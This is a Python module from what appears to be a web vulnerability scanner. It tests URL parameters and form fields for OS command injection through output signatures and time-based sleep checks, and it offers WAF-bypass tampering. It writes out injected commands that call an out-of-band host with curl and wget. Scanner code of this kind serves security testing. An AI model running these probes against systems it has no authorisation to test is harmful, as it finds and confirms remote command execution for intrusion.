"""
cyberm4fia-scanner - Command Injection Module
OS Command Injection detection (Threaded)
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import time
import re
from utils.colors import log_info, log_success, log_vuln
from utils.request import smart_request, lock, Stats, Config
from modules.payloads import CMDI_PAYLOADS, CMDI_SIGNATURES
from modules.smart_payload import probe_cmdi_context
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import httpx


def _match_standalone_output_line(text, candidates):
    """Return matched token only when it appears as a clean output line."""
    normalized = {c.lower() for c in candidates}
    for line in text.splitlines():
        cleaned = re.sub(r"\s+", " ", line.strip().lower())
        if not cleaned or "<" in cleaned or ">" in cleaned:
            continue
        if cleaned in normalized:
            return cleaned
    return None


def detect_cmdi(text):
    """Check response for high-confidence command execution indicators."""
    text_lower = text.lower()

    # Strong indicators first.
    for sig in CMDI_SIGNATURES.get("linux_id", []):
        if sig.lower() in text_lower:
            return "linux_id", sig

    for sig in CMDI_SIGNATURES.get("windows_dir", []):
        if sig.lower() in text_lower:
            return "windows_dir", sig

    # "whoami" style outputs are noisy; only accept exact standalone lines.
    linux_user = _match_standalone_output_line(
        text, CMDI_SIGNATURES.get("linux_whoami", [])
    )
    if linux_user:
        return "linux_whoami", linux_user

    windows_user = _match_standalone_output_line(
        text, CMDI_SIGNATURES.get("windows_whoami", [])
    )
    if windows_user:
        return "windows_whoami", windows_user

    return None, None


def _test_cmdi_param(param, params, parsed, delay):
    """Test a single param for CMDi - error-based only (helper for threading)"""
    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
    probe = probe_cmdi_context(
        urlunparse(parsed), param, flat_params, method="get", delay=delay
    )
    smart = probe.get("smart_payloads", [])
    if smart:
        all_payloads = smart + [p for p in CMDI_PAYLOADS if p not in smart]
    else:
        all_payloads = list(CMDI_PAYLOADS)

    if Config.OOB_CLIENT and Config.OOB_CLIENT.ready:
        oob_url = Config.OOB_CLIENT.generate_payload("cmdi", param)
        all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])

    for payload in all_payloads:
        if "sleep" in payload.lower():
            continue

        test_params = params.copy()
        test_params[param] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
        try:
            resp = smart_request("get", test_url, delay=delay)
            cmd_type, sig = detect_cmdi(resp.text)
            if cmd_type:
                with lock:
                    Stats.vulnerabilities_found += 1
                source = "🧠 Smart" if payload in smart else "📋 Static"
                log_vuln(f"COMMAND INJECTION FOUND! [{source}]")
                log_success(f"Param: {param} | Type: {cmd_type} | Output: {sig}")
                log_success(f"Payload: {payload}")
                return {
                    "type": "CMDi_Param",
                    "param": param,
                    "payload": payload,
                    "cmd_type": cmd_type,
                    "url": test_url,
                }
        except Exception:
            pass
    return None


def _test_cmdi_form_input(inp, inputs, hidden_data, method, target, delay):
    """Test a single form input for CMDi - error-based only (helper for threading)"""
    form_data = {n: "127.0.0.1" for n in inputs}
    if hidden_data:
        form_data.update(hidden_data)
    probe = probe_cmdi_context(
        target, inp, {}, method=method, form_data=form_data, delay=delay
    )
    smart = probe.get("smart_payloads", [])
    if smart:
        all_payloads = smart + [p for p in CMDI_PAYLOADS if p not in smart]
    else:
        all_payloads = list(CMDI_PAYLOADS)

    if Config.OOB_CLIENT and Config.OOB_CLIENT.ready:
        oob_url = Config.OOB_CLIENT.generate_payload("cmdi", inp)
        all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])

    for payload in all_payloads:
        if "sleep" in payload.lower():
            continue

        data = {n: "127.0.0.1" for n in inputs}
        if hidden_data:
            data.update(hidden_data)
        data[inp] = payload
        try:
            resp = smart_request(
                method,
                target,
                data=data if method == "post" else None,
                params=data if method != "post" else None,
                delay=delay,
            )
            cmd_type, sig = detect_cmdi(resp.text)
            if cmd_type:
                with lock:
                    Stats.vulnerabilities_found += 1
                source = "🧠 Smart" if payload in smart else "📋 Static"
                log_vuln(f"COMMAND INJECTION FOUND! [{source}]")
                log_success(f"Form field: {inp} | Type: {cmd_type}")
                log_success(f"Payload: {payload}")
                return {
                    "type": "CMDi_Form",
                    "field": inp,
                    "payload": payload,
                    "cmd_type": cmd_type,
                    "url": target,
                    "method": method,
                    "hidden_data": hidden_data,
                }
        except Exception:
            pass
    return None


def _test_blind_cmdi_sequential(url, forms, delay):
    """Test blind CMDi (time-based) - runs sequentially for accurate timing"""
    vulns = []
    sleep_payloads = [p for p in CMDI_PAYLOADS if "sleep" in p.lower()]

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # Params
    for param in params.keys():
        for payload in sleep_payloads:
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = urlunparse(
                parsed._replace(query=urlencode(test_params, doseq=True))
            )
            try:
                start = time.time()
                smart_request("get", test_url, delay=delay)
                elapsed = time.time() - start
                if elapsed > 4.5:
                    # Baseline Verification to prevent False Positives
                    start_base = time.time()
                    base_params = params.copy()
                    base_params[param] = ["cybm4f1a_test"]
                    base_url = urlunparse(
                        parsed._replace(query=urlencode(base_params, doseq=True))
                    )
                    smart_request("get", base_url, delay=delay)
                    base_elapsed = time.time() - start_base

                    if base_elapsed < 2.0:
                        with lock:
                            Stats.vulnerabilities_found += 1
                        log_vuln("BLIND COMMAND INJECTION FOUND!")
                        log_success(
                            f"Param: {param} | Delay: {elapsed:.2f}s (Baseline: {base_elapsed:.2f}s)"
                        )
                        vulns.append(
                            {
                                "type": "Blind_CMDi_Param",
                                "param": param,
                                "payload": payload,
                                "delay": elapsed,
                                "url": test_url,
                            }
                        )
                        break
                    else:
                        log_info(
                            f"Ignored false positive on {param} (Network delay detected: {base_elapsed:.2f}s)"
                        )
            except Exception:
                pass

    # Forms
    for form in forms:
        action = form.get("action") or url
        method = form.get("method", "get").lower()
        target = urljoin(url, action)
        all_inputs = form.find_all(["input", "textarea"])
        inputs = [
            i.get("name")
            for i in all_inputs
            if i.get("name")
            and i.get("type", "text") not in ["submit", "hidden", "button", "image"]
        ]
        hidden_data = {
            i.get("name"): i.get("value", "")
            for i in all_inputs
            if i.get("type") == "hidden" and i.get("name")
        }

        for inp in inputs:
            for payload in sleep_payloads:
                data = {n: "127.0.0.1" for n in inputs}
                if hidden_data:
                    data.update(hidden_data)
                data[inp] = payload
                try:
                    start = time.time()
                    smart_request(
                        method,
                        target,
                        data=data if method == "post" else None,
                        params=data if method != "post" else None,
                        delay=delay,
                    )
                    elapsed = time.time() - start
                    if elapsed > 4.5:
                        # Baseline Verification
                        base_data = {n: "cybm4f1a_test" for n in inputs}
                        if hidden_data:
                            base_data.update(hidden_data)

                        start_base = time.time()
                        smart_request(
                            method,
                            target,
                            data=base_data if method == "post" else None,
                            params=base_data if method != "post" else None,
                            delay=delay,
                        )
                        base_elapsed = time.time() - start_base

                        if base_elapsed < 2.0:
                            with lock:
                                Stats.vulnerabilities_found += 1
                            log_vuln("BLIND COMMAND INJECTION FOUND!")
                            log_success(
                                f"Form field: {inp} | Delay: {elapsed:.2f}s (Baseline: {base_elapsed:.2f}s)"
                            )
                            vulns.append(
                                {
                                    "type": "Blind_CMDi_Form",
                                    "field": inp,
                                    "payload": payload,
                                    "delay": elapsed,
                                    "url": target,
                                    "method": method,
                                    "hidden_data": hidden_data,
                                }
                            )
                            break
                        else:
                            log_info(
                                f"Ignored false positive on {inp} (Network delay detected: {base_elapsed:.2f}s)"
                            )
                except Exception:
                    pass

    return vulns


def scan_cmdi(url, forms, delay, threads=None):
    """Scan for Command Injection vulnerabilities (threaded)"""
    from utils.tamper import get_tamper_chain

    if threads is None:
        threads = Config.THREADS

    # Apply tamper chain for WAF bypass variants
    chain = get_tamper_chain()
    payloads = list(CMDI_PAYLOADS)
    if chain.active:
        payloads = chain.apply_list(payloads)

    log_info(
        f"Testing Command Injection with {len(payloads)} payloads ({threads} threads)..."
    )
    vulns = []

    # 1. Error-based CMDi (threaded)
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params.keys():
            futures.append(
                executor.submit(_test_cmdi_param, param, params, parsed, delay)
            )

        for form in forms:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            all_inputs = form.find_all(["input", "textarea"])
            inputs = [
                i.get("name")
                for i in all_inputs
                if i.get("name")
                and i.get("type", "text") not in ["submit", "hidden", "button", "image"]
            ]
            hidden_data = {
                i.get("name"): i.get("value", "")
                for i in all_inputs
                if i.get("type") == "hidden" and i.get("name")
            }

            # Add submit button
            submit_btn = form.find("input", {"type": "submit"})
            if submit_btn and submit_btn.get("name"):
                hidden_data[submit_btn.get("name")] = submit_btn.get("value", "Submit")

            for inp in inputs:
                futures.append(
                    executor.submit(
                        _test_cmdi_form_input,
                        inp,
                        inputs,
                        hidden_data,
                        method,
                        target,
                        delay,
                    )
                )

        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    vulns.append(result)
            except Exception:
                pass

    # 2. Blind CMDi (sequential - timing accuracy)
    blind_vulns = _test_blind_cmdi_sequential(url, forms, delay)
    vulns.extend(blind_vulns)

    return vulns
